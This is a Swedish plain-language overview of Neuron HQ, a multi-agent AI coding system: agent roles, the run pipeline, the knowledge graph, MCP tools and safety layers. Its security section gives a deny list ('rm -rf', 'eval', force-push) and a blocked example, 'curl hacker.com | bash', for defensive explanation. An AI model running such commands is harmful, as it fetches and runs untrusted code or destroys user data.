# Neuron HQ — Hur Allting Hänger Ihop

> Version för icke-utvecklare · Session 90 · 2026-03-16
> Teknisk referens: [architecture-technical-reference.md](architecture-technical-reference.md)

---

## Vad är Neuron HQ?

Neuron HQ är ett **kontrollrum för AI-agenter**. Tänk dig en redaktion där chefredaktören (Manager) delegerar uppgifter till reportrar, faktagranskare och arkivarier — fast alla är AI-agenter som skriver kod istället för artiklar.

Du ger systemet en **brief** (en beskrivning av vad du vill ha gjort) och en tidsbudget. Sedan arbetar agenterna autonomt tills uppgiften är klar eller tiden tar slut.

---

## De tre delarna du interagerar med

```
┌──────────────────────────────────────────────────────────────┐
│                                                              │
│     DU                                                       │
│      │                                                       │
│      ├── Terminal (CLI)                                      │
│      │    "Kör det här uppdraget"                            │
│      │    "Visa kostnaderna"                                 │
│      │    "Vad hände i senaste körningen?"                   │
│      │                                                       │
│      └── Claude Desktop (MCP)                                │
│           "Sök i kunskapsbasen"                              │
│           "Indexera den här videon"                           │
│           "Ge mig en briefing om AI-reglering"               │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### Terminal (CLI) — för att starta och följa körningar

Det här är kommandoraden där du startar uppdrag. Exempel:

```bash
# Starta en körning
npx tsx src/cli.ts run neuron-hq --brief briefs/2026-03-16-td3a-mcp-server-split.md --hours 1

# Se vad som hände
npx tsx src/cli.ts report 20260316-0246-neuron-hq

# Visa kostnader
npx tsx src/cli.ts costs --last 10
```

### Claude Desktop (MCP) — för att prata med kunskapsbasen

Det här är gränssnittet där du ställer frågor och ger instruktioner i naturligt språk. Neuron HQ exponerar **32 verktyg** som Claude kan använda, organiserade i **10 grupper** (scopes).

---

## Agentlaget — 11 specialister

Tänk på agenterna som ett team med olika roller. Varje agent är en AI (Claude) med en specifik uppgift och specifika verktyg.

### Hierarkin

```
                    ┌─────────────┐
                    │   MANAGER   │
                    │  "Chefen"   │
                    └──────┬──────┘
                           │
          ┌────────────────┼────────────────┐
          │                │                │
    ┌─────▼─────┐   ┌─────▼─────┐   ┌─────▼──────┐
    │ UTFÖRARE  │   │ GRANSKARE │   │ KUNSKAPS-  │
    │           │   │           │   │ ARBETARE   │
    │ Gör jobbet│   │ Kollar    │   │ Lär sig    │
    │           │   │ kvaliteten│   │            │
    └───────────┘   └───────────┘   └────────────┘
```

### Varje agent förklarad

**1. Manager — Chefen**
> *Vad den gör:* Läser briefen, planerar arbetet, delegerar till andra agenter, fattar beslut.
>
> *Liknelse:* En projektledare som bryter ner ett stort uppdrag i små delar och fördelar dem till rätt person.
>
> *Exempel:* "Briefen vill ha 10 nya scopes. Jag delar upp det i 5 uppgifter och skickar dem parallellt till tre Implementers."

**2. Implementer — Kodskrivaren**
> *Vad den gör:* Tar emot en liten, konkret uppgift och skriver koden.
>
> *Liknelse:* En utvecklare som får en post-it med "skriv funktion X" och sätter sig och kodar.
>
> *Viktigt:* Flera Implementers kan arbeta **samtidigt** på olika delar — som ett team vid separata skrivbord. Varje Implementer jobbar i en egen kopia av koden (en "worktree") så de inte krockar.

**3. Reviewer — Kvalitetsgranskaren**
> *Vad den gör:* Läser ALL kod som skrivits, kör tester, kontrollerar att briefens krav är uppfyllda. Ger betyget GREEN (godkänt), YELLOW (tveksamt) eller RED (underkänt).
>
> *Liknelse:* En faktagranskare som läser hela artikeln och säger "ja, det stämmer" eller "nej, stycke 3 är fel".
>
> *Stoplight-systemet:*
> - 🟢 **GREEN** = Allt godkänt → koden får slås ihop
> - 🟡 **YELLOW** = Nästan bra → Manager beslutar
> - 🔴 **RED** = Problem → tillbaka till Implementer

**4. Tester — Provköraren**
> *Vad den gör:* Kör hela testsviten (alla 2371 tester) och rapporterar om något gick sönder.
>
> *Liknelse:* En testpilot som trycker på alla knappar och kollar att inget kraschar.

**5. Researcher — Utforskaren**
> *Vad den gör:* Läser koden, hittar mönster, föreslår förbättringar. Producerar `ideas.md`.
>
> *Liknelse:* En analytiker som läser igenom hela arkivet och säger "Jag hittade tre möjligheter vi borde utforska".

**6. Merger — Integreraren**
> *Vad den gör:* Tar den godkända koden och lägger in den i det riktiga repot. Skapar en commit.
>
> *Liknelse:* En redaktör som trycker på "publicera" efter att artikeln godkänts.
>
> *Viktig regel:* Merger **vägrar** köra om Reviewer inte sagt GREEN. Det är ett hårt lås.

**7. Historian — Minnesskrivaren**
> *Vad den gör:* Skriver ner vad som hände i körningen — vilka mönster som fungerade, vilka fel som uppstod, vad systemet lärde sig.
>
> *Liknelse:* En arkivarie som för dagbok efter varje arbetsdag.

**8. Librarian — Forskaren**
> *Vad den gör:* Söker på arxiv efter vetenskapliga artiklar, sparar intressanta tekniker.
>
> *Liknelse:* En bibliotekarie som bevakar nya publikationer inom ditt område.

**9. Consolidator — Städaren**
> *Vad den gör:* Underhåller kunskapsgrafen — hittar dubbletter, slår ihop liknande noder, rensar gamla.
>
> *Liknelse:* Någon som går igenom arkivskåpet och slår ihop mappar som handlar om samma sak.

**10. Brief Agent — Briefinställaren**
> *Vad den gör:* Hjälper dig skriva en brief genom att ställa frågor och föreslå formuleringar.
>
> *Liknelse:* En kollega som säger "Vad exakt vill du ha? Låt mig hjälpa dig formulera det."

**11. Knowledge Manager — Kunskapsförvaltaren**
> *Vad den gör:* Hittar kunskapsluckor automatiskt, söker på webben, indexerar nya källor, och fyller luckorna.
>
> *Liknelse:* En forskningsassistent som ser att "vi vet för lite om X", googlar det, och sparar det viktigaste.

---

## Hur en körning fungerar — steg för steg

Låt oss följa en riktig körning från start till slut:

```
DU: npx tsx src/cli.ts run neuron-hq --brief briefs/td3a-mcp-split.md --hours 1

    ┌─────────────────────────────────────────────────┐
    │  STEG 1: FÖRBEREDELSE                           │
    │                                                 │
    │  Systemet:                                      │
    │  • Skapar en unik ID (t.ex. 20260316-0246)     │
    │  • Kopierar hela kodbasen till en arbetskopia   │
    │  • Kör alla tester för att veta utgångsläget    │
    │    → "2371 tester gröna — bra, vi vet basen"   │
    │  • Sparar briefen                               │
    └──────────────────────┬──────────────────────────┘
                           │
    ┌──────────────────────▼──────────────────────────┐
    │  STEG 2: MANAGER LÄSER OCH PLANERAR             │
    │                                                 │
    │  Manager:                                       │
    │  • Läser briefen: "Splitta MCP-servern"         │
    │  • Kollar kunskapsgrafen: "Vad vet vi redan?"   │
    │  • Läser historik: "Hur gick liknande förut?"   │
    │  • Skriver en plan:                             │
    │    T1: Konsolidera speaker-tools (8→1)          │
    │    T2: Konsolidera job-tools (4→1)              │
    │    T3: Skapa scope-registry (beror på T1+T2)    │
    └──────────────────────┬──────────────────────────┘
                           │
    ┌──────────────────────▼──────────────────────────┐
    │  STEG 3: PARALLELLT ARBETE                      │
    │                                                 │
    │  Manager: "T1 och T2 är oberoende — kör!"      │
    │                                                 │
    │  ┌───────────────┐  ┌───────────────┐           │
    │  │ Implementer A │  │ Implementer B │           │
    │  │ (egen kopia)  │  │ (egen kopia)  │           │
    │  │               │  │               │           │
    │  │ Konsoliderar  │  │ Konsoliderar  │           │
    │  │ speakers      │  │ jobs          │           │
    │  │ 8→1 tool      │  │ 4→1 tool      │           │
    │  └───────┬───────┘  └───────┬───────┘           │
    │          │                  │                    │
    │          └────────┬─────────┘                    │
    │                   │ klart!                       │
    │                   ▼                              │
    │  Slå ihop båda ändringarna i huvudkopian         │
    └──────────────────────┬──────────────────────────┘
                           │
    ┌──────────────────────▼──────────────────────────┐
    │  STEG 4: SEKVENTIELLT ARBETE                    │
    │                                                 │
    │  T3 beror på T1+T2, så den körs EFTER:          │
    │                                                 │
    │  ┌───────────────┐                              │
    │  │ Implementer C │                              │
    │  │               │                              │
    │  │ Skapar scope- │                              │
    │  │ registry med  │                              │
    │  │ 10 grupper    │                              │
    │  └───────┬───────┘                              │
    │          │                                      │
    │          ▼                                      │
    │  Slå ihop i huvudkopian                          │
    └──────────────────────┬──────────────────────────┘
                           │
    ┌──────────────────────▼──────────────────────────┐
    │  STEG 5: KVALITETSKONTROLL                      │
    │                                                 │
    │  Tester: Kör alla 2371 tester                   │
    │    → "PASS: 2328 gröna" (vissa tester borttagna │
    │       med de gamla filerna — förväntat!)         │
    │                                                 │
    │  Reviewer: Går igenom ALLT                      │
    │    → Kollar: Stämmer koden med briefen?         │
    │    → Kollar: Finns det säkerhetsproblem?         │
    │    → Kollar: Passerar alla acceptance criteria?   │
    │    → Betyg: 🟢 GREEN                            │
    └──────────────────────┬──────────────────────────┘
                           │
    ┌──────────────────────▼──────────────────────────┐
    │  STEG 6: PUBLICERING OCH LÄRANDE                │
    │                                                 │
    │  Merger: Lägger in koden i det riktiga repot    │
    │    → git commit med alla ändringar              │
    │                                                 │
    │  Historian: Skriver ner vad som hände           │
    │    → "MCP-split gick bra, scopearkitektur       │
    │       fungerar, parallella implementers          │
    │       hade inga konflikter"                      │
    │                                                 │
    │  Systemet: Uppdaterar beliefs (Bayesianskt)     │
    │    → "Refaktoreringar lyckas i 91% av fallen"   │
    └──────────────────────┬──────────────────────────┘
                           │
                           ▼
    ┌─────────────────────────────────────────────────┐
    │  RESULTAT                                       │
    │                                                 │
    │  report.md   → "🟢 GREEN — allt godkänt"       │
    │  questions.md → "Inga blockers"                 │
    │  ideas.md    → "5 idéer för framtiden"          │
    │  usage.json  → "X kr i API-kostnad"             │
    │                                                 │
    │  DU: npx tsx src/cli.ts report 20260316-0246    │
    │       → Läser rapporten                         │
    └─────────────────────────────────────────────────┘
```

---

## Kunskapsgrafen — systemets minne

Neuron HQ har ett **långtidsminne** i form av en kunskapsgraf. Tänk på det som ett nät av post-its som är sammankopplade med trådar.

### Fem typer av post-its (noder)

| Typ | Vad det är | Exempel |
|-----|-----------|---------|
| **Pattern** | En lösning som fungerat | "Batch-inserts med unnest är 60× snabbare" |
| **Error** | Ett problem som uppstått | "dotenv 17.3 skriver till stdout" |
| **Technique** | En teknik från forskning | "HNSW-index ger O(log n) sökning" |
| **Run** | En sammanfattning av en körning | "Körning 141: MCP split, GREEN" |
| **Agent** | En observation om en agent | "Researcher fungerar bäst med specifika frågor" |

### Trådarna mellan (kanter)

| Tråd | Betydelse | Exempel |
|------|-----------|---------|
| **solves** | Denna lösning fixar detta problem | Pattern "batch unnest" → solves → Error "N+1 queries" |
| **discovered_in** | Hittades i denna körning | Technique "HNSW" → discovered_in → Run 105 |
| **related_to** | Hänger ihop | Pattern "scope split" ↔ related_to ↔ Pattern "consolidation" |
| **causes** | Orsakar | Error "stdout-förorening" → causes → Error "MCP JSON-parse" |
| **used_by** | Används av denna agent | Technique "semantic dedup" → used_by → Agent "consolidator" |

### Hur minnet hålls fräscht

- **Confidence decay**: Varje post-it har ett "förtroende-tal" (0–1). Om ingen refererar till den på länge sjunker talet. En post-it med 0.1 betraktas som "förlegad".
- **Dedup**: Innan en ny post-it läggs till, kollar systemet om det redan finns en liknande. Om likheten är >90% blockeras dubbletten.
- **Consolidator**: Var 10:e körning gör Consolidator-agenten rent — slår ihop dubbletter, tar bort inaktuella noder.

### Var lagras det?

Allt lagras på **två ställen** samtidigt:

```
┌─────────────────────┐     ┌─────────────────────────────┐
│  Filer (alltid)     │     │  PostgreSQL (snabbt)        │
│                     │     │                             │
│  memory/graph.json  │     │  Tabell: kg_nodes           │
│  (hela grafen)      │     │  + vektorer (1024 dim)      │
│                     │     │  + HNSW-index               │
│  Funkar utan DB     │     │  = blixtsnabb sökning       │
└─────────────────────┘     └─────────────────────────────┘
```

**Om databasen är nere?** Systemet fortsätter med enbart filerna. Inga fel, bara långsammare sökning.

---

## Bayesianskt lärande — systemet blir smartare

Neuron HQ lär sig av sina körningar. Efter varje körning samlar det in signaler:

| Signal | Vad det mäter | Exempel |
|--------|---------------|---------|
| Stoplight | Blev det GREEN? | GREEN = bra, RED = dåligt |
| Re-delegering | Behövde Manager skicka tillbaka jobb? | 0 gånger = effektivt |
| Blockerade kommandon | Försökte agenter göra förbjudna saker? | 0 = disciplinerat |
| Nya tester | Lades det till tester? | >0 = bra för features |

Dessa signaler uppdaterar **beliefs** (övertygelser):

> "Researcher lyckas i 42% av fallen med feature-briefs"
> "Refaktoreringar lyckas i 91% av fallen"

Manager läser dessa beliefs i nästa körning och anpassar sig:

> "⚠️ Researcher har lågt confidence — ge tydligare instruktioner"
> "✓ Vi är bra på refaktorering — kör på!"

---

## MCP — tre lager av genvägar

MCP (Model Context Protocol) är hur Claude Desktop pratar med Neuron HQ. Det finns tre lager, från grundläggande till avancerat:

### Lager 1: Verktyg (32 stycken i 10 grupper)

Varje verktyg gör **en specifik sak**. De är organiserade i grupper (scopes):

| Grupp | Vad den gör | Verktyg |
|-------|------------|---------|
| **aurora-search** | Söka i kunskapsbasen | Sök, fråga, status |
| **aurora-insights** | Analys och briefings | Tidslinje, briefing, forskningsförslag |
| **aurora-memory** | Minne och lärande | Kom ihåg, minns, statistik |
| **aurora-ingest-text** | Indexera text | URL:er, dokument |
| **aurora-ingest-media** | Indexera media | Video, bilder, böcker, PDF |
| **aurora-media** | Hantera media | Talare, jobb, metadata |
| **aurora-library** | Kunskapsbibliotek | Artiklar, Knowledge Manager |
| **aurora-quality** | Kvalitetskontroll | Färskhet, korsreferenser, confidence |
| **neuron-runs** | Körningar | Lista, starta, kostnader |
| **neuron-analytics** | Analys | Dashboard, beliefs, statistik |

> **Före:** 45 verktyg i en enda stor klump
> **Efter (TD-3a):** 32 verktyg i 10 fokuserade grupper

**Fem verktyg konsoliderades:**

| Förut (många verktyg) | Nu (ett verktyg med actions) |
|----------------------|------------------------------|
| speaker_gallery, speaker_rename, speaker_merge, ... (8 st) | `aurora_speakers` med action: gallery\|rename\|merge\|... |
| job_status, job_list, job_stats, job_cancel (4 st) | `aurora_jobs` med action: status\|list\|stats\|cancel |
| memory_remember, memory_recall, memory_stats (3 st) | `aurora_memory` med action: remember\|recall\|stats |

### Lager 2: Prompts (19 genvägar)

Prompts är **färdiga instruktioner** som kombinerar verktyg inom en grupp. De syns i Claude Desktops `+`-meny med svenska namn:

| Prompt | Vad den gör |
|--------|------------|
| **sok-och-svara** | "Sök efter X och ge mig ett sammanfattat svar" |
| **full-briefing** | "Ge mig en komplett briefing om allt vi vet" |
| **indexera-video** | "Indexera den här YouTube-videon" |
| **kvalitetsrapport** | "Hur färskt och tillförlitligt är det vi vet?" |
| **dashboard** | "Visa dashboard med körningar och statistik" |

> Tänk på prompts som **recept** — istället för att du manuellt kör tre verktyg i rätt ordning, trycker du på en knapp.

### Lager 3: Skills (8 arbetsflöden)

Skills är **komplexa arbetsflöden** som kombinerar verktyg från FLERA grupper:

| Skill | Vad den gör | Vilka grupper den använder |
|-------|------------|---------------------------|
| **researcha-amne** | Fullständig research | search → insights → library |
| **indexera-och-lar** | Indexera + kvalitetskoll | ingest → quality → memory |
| **kunskapscykel** | Hel kunskapscykel | search → insights → library → quality |
| **indexera-youtube** | YouTube-pipeline | ingest-media → media → search |
| **speaker-analys** | Talaranalys | media → search → insights |
| **kvalitetskontroll** | Systemkvalitet | quality → insights → runs |
| **starta-korning** | Starta Neuron-run | runs + analytics |
| **system-oversikt** | Hela systemet | analytics + runs |

> Tänk på skills som **hela arbetsprocesser** — de kedjar ihop prompter och verktyg i en logisk sekvens.

### Hur de tre lagren hänger ihop

```
┌─────────────────────────────────────────────┐
│ Lager 3: SKILLS                             │
│ "Gör en hel kunskapscykel"                  │
│  = search + insights + library + quality     │
│  (korsar flera grupper)                      │
├─────────────────────────────────────────────┤
│ Lager 2: PROMPTS                            │
│ "Sök och svara"                             │
│  = aurora_search → aurora_ask               │
│  (inom en grupp)                            │
├─────────────────────────────────────────────┤
│ Lager 1: VERKTYG                            │
│ aurora_search({ query: "AI-reglering" })    │
│  (ett enda anrop)                           │
└─────────────────────────────────────────────┘
```

**Tumregel:**
- **Enkelt?** Använd ett verktyg direkt
- **Standarduppgift?** Använd en prompt
- **Komplext arbetsflöde?** Använd en skill

---

## Säkerhetssystemet — tre lager av skydd

Neuron HQ låter AI-agenter köra kommandon på din dator. Det kräver säkerhet:

### Lager 1: Förbjudna kommandon

Vissa saker är **alltid blockerade**, oavsett allt annat:

> `--force-push` (kan skriva över andras kod)
> `eval` (kan köra godtycklig kod)
> `rm -rf` (kan radera allt)

### Lager 2: Tillåtna kommandon

Bara kommandon på en **vit lista** får köras:

> ✓ `git status` — visa filstatus
> ✓ `pnpm test` — kör tester
> ✓ `cat fil.txt` — läs en fil
> ✗ `curl hacker.com | bash` — BLOCKERAT (inte på listan)

### Lager 3: Filskydd

Agenter får **bara skriva** till sin egen arbetskopia och sitt resultat-arkiv:

> ✓ `workspaces/20260316-0246/...` — agentens kopia
> ✓ `runs/20260316-0246/...` — körningens resultat
> ✗ `/Users/mpmac/Documents/...` — BLOCKERAT

### Allt loggas

Varje kommando, varje filskrivning, varje blockering loggas i `audit.jsonl`. Det är en obrytbar dagbok — man kan bara lägga till, aldrig ta bort.

---

## Kostnadskontroll

Varje agent använder en viss mängd **tokens** (ord som AI:n läser och skriver). Tokens kostar pengar.

| Agent | Modell | Varför |
|-------|--------|--------|
| Manager, Implementer, Reviewer, Tester | **Sonnet** (dyrare) | Behöver vara smarta |
| Researcher, Historian, Librarian | **Haiku** (billigare) | Enklare uppgifter |

Systemet spårar kostnader per körning och per agent. Du kan se dem med:

```bash
npx tsx src/cli.ts costs --last 10
```

---

## Kopplingar till LLM-forskning

Neuron HQ använder flera av de [8 LLM-typerna](../memory/research-llm-types-agents.md) som forskningen identifierat:

| LLM-typ | Hur Neuron HQ använder det |
|---------|---------------------------|
| **MoE** (Mixture of Experts) | Claude är troligtvis MoE-baserad — routar till specialiserade nätverk |
| **LAM** (Large Action Model) | Alla agenter ÄR LAM:ar — de tar actions via verktyg |
| **HLM** (Hierarchical LM) | Manager → Implementer-hierarkin är ett HLM-mönster |
| **VLM** (Vision-Language Model) | QwenVL analyserar bilder och PDF:er |
| **LCM** (Large Concept Model) | Ontologin (E4b) arbetar med koncept-noder — liknande princip |

---

## Siffror i korthet

| Vad | Antal |
|-----|-------|
| Agenter | 11 |
| MCP-grupper | 10 |
| MCP-verktyg | 32 |
| MCP-prompts | 19 |
| Skills | 8 |
| Genomförda körningar | 143 |
| Tester | 2371 |
| Kunskapsnoder | 122 |
| Sessioner | 90 |

---

## Ordlista

| Begrepp | Förklaring |
|---------|-----------|
| **Brief** | En instruktionsfil som beskriver vad du vill ha gjort |
| **Run/Körning** | En komplett exekvering — från brief till rapport |
| **STOPLIGHT** | Betyg: GREEN (godkänt), YELLOW (tveksamt), RED (underkänt) |
| **Scope** | En grupp av relaterade MCP-verktyg |
| **Prompt** | En färdig instruktion som kedjar verktyg inom ett scope |
| **Skill** | Ett komplext arbetsflöde som korsar flera scopes |
| **Worktree** | En separat kopia av koden — för parallellt arbete utan krockar |
| **Kunskapsgraf** | Nätverket av allt systemet vet — noder och kopplingar |
| **Confidence** | Hur säkert systemet är på en kunskaps-post-it (0–1) |
| **Beliefs** | Bayesianska övertygelser om vad som fungerar bra/dåligt |
| **Token** | Ett "ord" som AI:n läser eller skriver — kostar pengar |
| **pgvector** | Databastillägg som möjliggör sökning baserat på "likhet" |
| **Embedding** | En lång rad siffror (1024 st) som representerar en text — texters som liknar varandra har liknande siffror |
| **Decay** | Att gamla kunskapsnoder gradvis tappar i förtroende |
| **MCP** | Model Context Protocol — hur Claude Desktop pratar med externa system |
